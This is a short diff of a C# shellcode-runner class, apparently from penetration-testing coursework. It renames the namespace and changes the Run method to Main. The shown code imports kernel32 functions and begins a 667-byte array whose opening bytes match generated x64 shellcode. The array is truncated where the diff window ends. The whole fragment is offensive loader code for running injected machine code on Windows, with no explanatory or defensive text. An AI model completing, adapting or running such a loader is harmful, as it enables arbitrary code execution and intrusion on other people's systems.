@@ -1,6 +1,6 @@
 ﻿using System.Runtime.InteropServices;
 
-namespace ClassLibrary1
+namespace Pen300.CS
 {
     public class ShellcodeExecution
     {
@@ -15,7 +15,7 @@ namespace ClassLibrary1
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
-        public static void Run()
+        public static void Main()
         {
             byte[] buf = new byte[667] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
             0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
